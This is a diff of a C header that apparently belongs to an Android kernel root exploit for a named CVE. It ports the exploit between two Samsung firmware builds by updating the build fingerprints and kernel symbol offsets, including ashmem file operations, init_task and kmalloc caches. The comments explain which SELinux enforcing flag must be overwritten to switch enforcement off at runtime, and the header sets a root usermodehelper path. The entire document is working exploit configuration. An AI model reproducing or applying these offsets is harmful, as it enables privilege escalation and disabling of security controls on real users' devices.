@@ -22,16 +22,16 @@
  *   5. worker_pool = 896 bytes
  */
 
-#define BUILD_VARIANT_LABEL "S908BXXSMGZB2"
+#define BUILD_VARIANT_LABEL "S901BXXSNGZD7"
 #ifndef BUILD_FINGERPRINT
-#define BUILD_FINGERPRINT "samsung/b0qcsx/b0q:15/AP3A.240905.015.A2/S908WVLS8FYG7:user/release-keys"
+#define BUILD_FINGERPRINT "samsung/r0sxeea/r0s:16/BP2A.250605.031.A3/S901BXXSNGZD7:user/release-keys"
 #endif
 
 /* ---- Kernel image layout (verified from QEMU kernel) ---- */
 #define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
 #define P0_PAGE_OFFSET   0xffffff8000000000ULL   /* 39-bit VA PAGE_OFFSET     */
 #define P0_PHYS_OFFSET   0x80000000ULL           /* memstart_addr             */
-#define P0_KERNEL_PHYS_LOAD 0x80000000ULL        /* exact GZB2 sboot pre-slide kernel base */
+#define P0_KERNEL_PHYS_LOAD 0x80000000ULL        /* exact GZD7 sboot pre-slide kernel base */
 
 #define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
 #define KERNELSNITCH_IDENTITY_END   0xffffff9000000000ULL   /* 64GB direct map */
@@ -40,8 +40,8 @@
 #define VMEMMAP_START    0xfffffffeffe00000ULL   /* 39-bit v5.10: -VMEMMAP_SIZE(0x1000000000)-2M; GDB-verified on live slab pages */
 
 /* ---- ashmem dispatch functions (CFI jump targets for v5.10 ARM64 Android) ---- */
-#define ASHMEM_MISC_FOPS_OFF 0x0206e060ULL   /* &ashmem_misc.fops */
-#define ASHMEM_FOPS_OFF      0x01b76850ULL   /* &ashmem_fops           */
+#define ASHMEM_MISC_FOPS_OFF 0x020ae060ULL   /* &ashmem_misc.fops */
+#define ASHMEM_FOPS_OFF      0x01bb0d10ULL   /* &ashmem_fops           */
 
 /* Function addresses (raw entry points) */
 #define ASHMEM_IOCTL_OFF         0x00c6818cULL   /* ashmem_ioctl           */
@@ -70,16 +70,16 @@
 #define NOOP_LLSEEK_OFF       0x0037ae34ULL   /* noop_llseek              */
 
 /* ---- Kernel data objects ---- */
-#define INIT_TASK_OFF           0x01e7dd00ULL   /* init_task           */
-#define ROOT_TASK_GROUP_OFF     0x020f5080ULL   /* root_task_group     */
+#define INIT_TASK_OFF           0x01ebdd00ULL   /* init_task           */
+#define ROOT_TASK_GROUP_OFF     0x02135080ULL   /* root_task_group     */
 /* Runtime enforce flag = selinux_state.enforcing @ +0x00
  * (selinux_state @ 0xffffffc00a8cccd8; offset verified via sel_write_enforce's
  * ldaprb/strb [x22]).  NOT selinux_enforcing_boot (0x02548484) — that one is
  * the boot-time value only; writing it changes nothing at runtime (the
  * 2026-08-08 device run's umh -EACCES: SELinux stayed enforcing). */
-#define SELINUX_ENFORCING_OFF   0x02248d58ULL   /* selinux_state.enforcing */
-#define KMALLOC_CACHES_OFF      0x01bbc240ULL   /* kmalloc_caches      */
-#define ANON_PIPE_BUF_OPS_OFF   0x019eb768ULL   /* anon_pipe_buf_ops   */
+#define SELINUX_ENFORCING_OFF   0x02288d58ULL   /* selinux_state.enforcing */
+#define KMALLOC_CACHES_OFF      0x01bf6700ULL   /* kmalloc_caches      */
+#define ANON_PIPE_BUF_OPS_OFF   0x01a25c28ULL   /* anon_pipe_buf_ops   */
 
 /* ---- Convenience macros (absolute addresses) ---- */
 #define ASHMEM_MISC_FOPS    (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
@@ -103,7 +103,7 @@
 /* ---- Root usermodehelper ---- */
 #define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
 #define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000f85acULL   /* GDB: &call_usermodehelper_exec_work - KIMAGE_TEXT_BASE */
-#define SYSTEM_UNBOUND_WQ_OFF 0x01e69e10ULL               /* GDB: &system_unbound_wq - KIMAGE_TEXT_BASE */
+#define SYSTEM_UNBOUND_WQ_OFF 0x01ea9e10ULL               /* GDB: &system_unbound_wq - KIMAGE_TEXT_BASE */
 
 /* ---- kCFI canonical (.cfi_jt) addresses ---------------------------------
  * CONFIG_CFI_CLANG is on: function pointers called indirectly (fops slots,
@@ -171,12 +171,12 @@
 #define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
 #define SLIDE_TRACEFS_EVENT_ID 104
 
-#define SLIDE_NFULNL_LOGGER_OFF        0x01e71380ULL
-#define SLIDE_LOGGERS_0_1_OFF          0x01e712b0ULL   /* &loggers[0][1] */
-#define SLIDE_RANDOM_BOOT_ID_DATA_OFF  0x0202e930ULL   /* &random_table[4].data */
+#define SLIDE_NFULNL_LOGGER_OFF        0x01eb1380ULL
+#define SLIDE_LOGGERS_0_1_OFF          0x01eb12b0ULL   /* &loggers[0][1] */
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF  0x0206e930ULL   /* &random_table[4].data */
 #define SLIDE_INIT_TASK_OFF            INIT_TASK_OFF
 #define SLIDE_ROOT_TASK_GROUP_OFF      ROOT_TASK_GROUP_OFF
-#define SLIDE_SYSCTL_BOOTID_OFF        0x022ed391ULL   /* sysctl_bootid buffer */
+#define SLIDE_SYSCTL_BOOTID_OFF        0x0232d391ULL   /* sysctl_bootid buffer */
 
 #define SLIDE_NFULNL_LOGGER_IMAGE \
   (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
